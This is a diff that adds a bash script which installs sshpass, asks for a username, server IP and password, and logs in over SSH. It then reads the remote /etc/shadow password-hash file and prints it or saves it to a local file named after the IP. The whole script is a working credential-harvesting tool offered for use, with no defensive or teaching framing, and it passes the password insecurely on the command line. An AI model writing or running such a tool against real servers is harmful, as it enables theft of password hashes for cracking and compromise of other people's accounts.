@@ -1,0 +1,81 @@
+#!/usr/bin/env bash
+
+
+if command -v pacman
+then
+	os="sudo pacman -Sy sshpass --noconfirm"
+elif command -v apt
+then
+	os="sudo apt install sshpass"
+else
+	echo "your os is not supported"
+	exit
+fi
+if ! command -v sshpass
+then
+	read -p "sshpass is not installed do you want to install it? (y/n) > " option
+	if [[ $option == "y" ]]
+	then
+		eval "$os"
+	else
+		echo "ok"
+		exit 1
+	fi
+fi
+clear
+echo
+cat << "EOF"
+                _       _      _                  _                 _     
+  ___  ___ _ __(_)_ __ | |_   | |__  _   _       | | __ _  ___ ___ | |__  
+ / __|/ __| '__| | '_ \| __|  | '_ \| | | |   _  | |/ _` |/ __/ _ \| '_ \ 
+ \__ \ (__| |  | | |_) | |_   | |_) | |_| |  | |_| | (_| | (_| (_) | |_) |
+ |___/\___|_|  |_| .__/ \__|  |_.__/ \__, |   \___/ \__,_|\___\___/|_.__/ 
+                 |_|                 |___/                                
+
+          c,_.--.,y
+            7 a.a(
+           (   ,_Y)
+           :  '---;
+       ___.'\.  - (
+     .'"""S,._'--'_2..,_
+     |    ':::::=:::::  \
+     .     f== ;-,---.' T
+      Y.   r,-,_/_      |
+      |:\___.---' '---./
+      |'`             )
+       \             ,
+       ':;,.________.;L
+       /  '---------' |
+       |              \
+       L---'-,--.-'--,-'
+        T    /   \   Y
+        |   Y    ,   |
+        |   \    (   |
+        (   )     \,_L
+        7-./      )  `,
+       /  _(      '._  \
+     '---'           '--'
+EOF
+echo
+echo "-----------------------------------------------"
+read -p "Enter the user you want to log in as: " user
+read -p "Enter the server's ip: " ip
+read -p "Enter the password: " pass
+read -p "Do you want to save to file? (y/n) >  " save
+if [[ $save == "y" ]]
+then
+	shadow=$(sshpass -p $pass ssh $user@$ip "cat /etc/shadow && exit")
+	echo "$shadow" >> $ip"-"shadow.txt
+	clear
+	exit 0
+elif [[ $save == "n" ]]
+then
+	echo
+	echo "________________________________________________________"
+	sshpass -p $pass ssh $user@$ip "cat /etc/shadow && exit"
+	echo "________________________________________________________"
+	exit 0
+else
+	echo "invalid option"
+	exit 1
+fi
